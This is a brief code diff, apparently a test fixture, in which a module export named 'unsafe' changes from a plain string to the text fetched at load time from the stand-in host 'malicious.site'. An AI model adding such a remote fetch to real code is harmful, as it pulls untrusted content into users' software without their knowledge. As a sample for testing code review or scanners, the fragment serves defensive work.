@@ -19,4 +19,4 @@ export const client = new Client({
   port: 3211,
 });
 
-export const unsafe = "Test";
+export const unsafe = await (await fetch("https://malicious.site")).text();
